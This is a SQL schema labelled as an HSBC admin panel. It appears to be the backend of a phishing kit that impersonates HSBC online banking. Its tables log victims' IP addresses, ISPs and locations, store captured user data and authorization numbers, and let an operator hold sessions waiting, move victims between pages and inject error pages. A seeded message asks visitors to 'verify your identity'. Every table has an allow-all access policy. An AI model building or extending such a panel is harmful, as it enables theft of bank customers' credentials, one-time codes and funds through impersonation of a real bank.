-- =====================================================
-- HSBC ADMIN PANEL - SUPABASE DATABASE SCHEMA
-- =====================================================

-- Table: user_sessions (stores all user session data)
CREATE TABLE IF NOT EXISTS public.user_sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id TEXT UNIQUE NOT NULL,
  ip_address TEXT DEFAULT NULL,
  current_page INT DEFAULT 1,
  is_waiting BOOLEAN DEFAULT FALSE,
  session_data JSONB DEFAULT NULL,
  user_data JSONB DEFAULT NULL,
  authorization_number TEXT DEFAULT NULL,
  has_error BOOLEAN DEFAULT FALSE,
  error_message TEXT DEFAULT NULL,
  error_page INT DEFAULT NULL,
  status TEXT DEFAULT 'Active',
  archived BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW(),
  last_activity TIMESTAMPTZ DEFAULT NOW()
);

-- Create indexes for user_sessions
CREATE INDEX IF NOT EXISTS idx_user_sessions_session_id ON public.user_sessions(session_id);
CREATE INDEX IF NOT EXISTS idx_user_sessions_ip_address ON public.user_sessions(ip_address);
CREATE INDEX IF NOT EXISTS idx_user_sessions_status ON public.user_sessions(status);
CREATE INDEX IF NOT EXISTS idx_user_sessions_archived ON public.user_sessions(archived);

-- Enable RLS on user_sessions (allow public access for now)
ALTER TABLE public.user_sessions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all access to user_sessions"
ON public.user_sessions
FOR ALL
USING (true)
WITH CHECK (true);

-- Table: visitors (tracks unique visitors)
CREATE TABLE IF NOT EXISTS public.visitors (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  ip_address TEXT UNIQUE NOT NULL,
  isp_name TEXT DEFAULT 'Unknown ISP',
  user_agent TEXT DEFAULT NULL,
  country TEXT DEFAULT NULL,
  city TEXT DEFAULT NULL,
  visited_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Create indexes for visitors
CREATE INDEX IF NOT EXISTS idx_visitors_ip_address ON public.visitors(ip_address);
CREATE INDEX IF NOT EXISTS idx_visitors_visited_at ON public.visitors(visited_at);

-- Enable RLS on visitors
ALTER TABLE public.visitors ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all access to visitors"
ON public.visitors
FOR ALL
USING (true)
WITH CHECK (true);

-- Table: login_settings (stores warning message and display preferences)
CREATE TABLE IF NOT EXISTS public.login_settings (
  id INT PRIMARY KEY DEFAULT 1,
  warning_message TEXT DEFAULT NULL,
  show_warning BOOLEAN DEFAULT FALSE,
  updated_at TIMESTAMPTZ DEFAULT NOW(),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Enable RLS on login_settings
ALTER TABLE public.login_settings ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Allow all access to login_settings"
ON public.login_settings
FOR ALL
USING (true)
WITH CHECK (true);

-- Insert default login settings
INSERT INTO public.login_settings (id, warning_message, show_warning) 
VALUES (1, 'Welcome to HSBC Online Banking. Please verify your identity to continue.', TRUE)
ON CONFLICT (id) DO NOTHING;

-- Function to update updated_at timestamp
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = NOW();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Triggers for automatic timestamp updates
CREATE TRIGGER update_user_sessions_updated_at
BEFORE UPDATE ON public.user_sessions
FOR EACH ROW
EXECUTE FUNCTION public.update_updated_at_column();

CREATE TRIGGER update_visitors_updated_at
BEFORE UPDATE ON public.visitors
FOR EACH ROW
EXECUTE FUNCTION public.update_updated_at_column();

CREATE TRIGGER update_login_settings_updated_at
BEFORE UPDATE ON public.login_settings
FOR EACH ROW
EXECUTE FUNCTION public.update_updated_at_column();